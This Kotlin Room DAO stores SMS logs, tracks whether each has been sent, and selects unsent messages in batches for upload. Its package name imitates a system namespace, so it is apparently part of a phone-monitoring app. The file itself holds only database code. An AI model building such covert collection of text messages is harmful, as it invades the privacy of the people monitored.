package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.SmsLog
import com.android.services.util.AppConstants
import java.util.*

@Dao
interface SmsLogDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(smsLogs: SmsLog)

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(smsLogs: List<SmsLog>)

    @Query("Update sms_log set sent_status = :updated_status where date BETWEEN :startDate AND :endDate")
    fun updateSmsLogs(updated_status: Int, startDate: Date, endDate: Date)

    @Query("Select * from sms_log where sent_status = :status order by date DESC limit ${AppConstants.otherLogsUploadLimit}")
    fun selectAllSmsLogs(status: Int): List<SmsLog>

    @Query("Select sms_number from sms_log where sms_id = :sms_id")
    fun checkIfAlreadyExist(sms_id: String): String?

    @Query("Select * from sms_log where sms_body=:messageBody")
    fun getAllSmsWithMessageBody(messageBody: String): List<SmsLog>

}